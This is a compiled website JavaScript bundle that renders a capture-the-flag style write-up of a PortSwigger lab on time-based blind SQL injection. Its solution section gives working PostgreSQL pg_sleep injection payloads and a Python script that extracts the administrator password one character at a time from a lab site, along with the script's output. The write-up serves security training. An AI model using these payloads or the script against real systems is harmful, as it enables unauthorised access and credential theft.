"use strict";(self.webpackChunkwebsite=self.webpackChunkwebsite||[]).push([[5096],{3905:function(e,t,n){n.d(t,{Zo:function(){return c},kt:function(){return m}});var r=n(7294);function i(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function a(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){i(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,r,i=function(e,t){if(null==e)return{};var n,r,i={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(i[n]=e[n]);return i}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(i[n]=e[n])}return i}var l=r.createContext({}),p=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):a(a({},t),e)),n},c=function(e){var t=p(e.components);return r.createElement(l.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,i=e.mdxType,o=e.originalType,l=e.parentName,c=s(e,["components","mdxType","originalType","parentName"]),d=p(n),m=i,f=d["".concat(l,".").concat(m)]||d[m]||u[m]||o;return n?r.createElement(f,a(a({ref:t},c),{},{components:n})):r.createElement(f,a({ref:t},c))}));function m(e,t){var n=arguments,i=t&&t.mdxType;if("string"==typeof e||i){var o=n.length,a=new Array(o);a[0]=d;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s.mdxType="string"==typeof e?e:i,a[1]=s;for(var p=2;p<o;p++)a[p]=n[p];return r.createElement.apply(null,a)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},9472:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return s},contentTitle:function(){return l},metadata:function(){return p},toc:function(){return c},default:function(){return d}});var r=n(7462),i=n(3366),o=(n(7294),n(3905)),a=["components"],s={},l="Lab: Blind SQL injection with time delays and information retrieval",p={unversionedId:"PortSwigger/SQL Injection/Lab 14",id:"PortSwigger/SQL Injection/Lab 14",isDocsHomePage:!1,title:"Lab: Blind SQL injection with time delays and information retrieval",description:"Task",source:"@site/docs/PortSwigger/SQL Injection/Lab 14.md",sourceDirName:"PortSwigger/SQL Injection",slug:"/PortSwigger/SQL Injection/Lab 14",permalink:"/Writeups/docs/PortSwigger/SQL Injection/Lab 14",editUrl:"https://github.com/datthinh1801/Writupes/tree/main/website/docs/PortSwigger/SQL Injection/Lab 14.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Lab: Blind SQL injection with time delays",permalink:"/Writeups/docs/PortSwigger/SQL Injection/Lab 13"},next:{title:"Lab: Blind SQL injection with out-of-band interaction",permalink:"/Writeups/docs/PortSwigger/SQL Injection/Lab 15"}},c=[{value:"Task",id:"task",children:[]},{value:"Solution",id:"solution",children:[]}],u={toc:c};function d(e){var t=e.components,n=(0,i.Z)(e,a);return(0,o.kt)("wrapper",(0,r.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"lab-blind-sql-injection-with-time-delays-and-information-retrieval"},"Lab: Blind SQL injection with time delays and information retrieval"),(0,o.kt)("h2",{id:"task"},"Task"),(0,o.kt)("p",null,"This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie."),(0,o.kt)("p",null,"The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information."),(0,o.kt)("p",null,"The database contains a different table called ",(0,o.kt)("inlineCode",{parentName:"p"},"users"),", with columns called ",(0,o.kt)("inlineCode",{parentName:"p"},"username")," and ",(0,o.kt)("inlineCode",{parentName:"p"},"password"),". You need to exploit the blind SQL injection vulnerability to find out the password of the ",(0,o.kt)("inlineCode",{parentName:"p"},"administrator")," user."),(0,o.kt)("p",null,"To solve the lab, log in as the ",(0,o.kt)("inlineCode",{parentName:"p"},"administrator")," user."),(0,o.kt)("h2",{id:"solution"},"Solution"),(0,o.kt)("p",null,"Firstly, I found this payload worked:  "),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"'||(SELECT+CASE+WHEN(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--\n")),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"The database is PostgreSQL.  ")),(0,o.kt)("p",null,"Then, with the following payload, I knew that the password's length is 20:  "),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"'||(SELECT+CASE+WHEN(LENGTH((SELECT+password+FROM+users+WHERE+username='administrator'))=20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--\n")),(0,o.kt)("p",null,"Next, the payload to figure out each letter is:  "),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"'||(SELECT+CASE+WHEN(SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--\n")),(0,o.kt)("p",null,"Script:  "),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-python"},"import requests\nimport string\nimport time\nfrom concurrent import futures\nfrom concurrent.futures import ThreadPoolExecutor\n\nURL = 'https://acab1f961f04ecd68015019c00fc00c0.web-security-academy.net/filter?category=Lifestyle'\nalphas = list(string.ascii_lowercase)\nalphas.extend(list(string.ascii_uppercase))\nalphas.extend(list(string.digits))\n\ndef brute(i):\n    for j in alphas:\n        print(f\"\\r{(i, j)}\", end=\"\")\n        COOKIES =  {'TrackingId':f\"HDE8HzOmqiPAyRBY'||(SELECT+CASE+WHEN(SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),{i},1)='{j}')+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END)--\",\n        'session':'zborbpfMUYHP1DUkgOtF1WID4ymPSr9G'}\n        start = time.perf_counter()\n        resp = requests.get(URL, cookies=COOKIES)\n        elapsed = time.perf_counter() - start\n        if elapsed > 2:\n            return j\n\nres = []\nfor i in range(1, 21):\n    res.append(brute(i))\nprint(''.join(res))\n")),(0,o.kt)("p",null,"Run script:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"(env) PS E:\\CTF> py .\\intruder.py\n(20, '0')x0mvpsnoq9ayf567jms0\n")),(0,o.kt)("p",null,"Login:  "),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/130177303-92b50ce6-4548-4ed7-a86f-f6041d3d44d3.png",alt:"image"}),"  "),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/130177354-9cc83e05-6e01-4ed0-a4ad-e464f081d128.png",alt:"image"})),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"Solved!")))}d.isMDXComponent=!0}}]);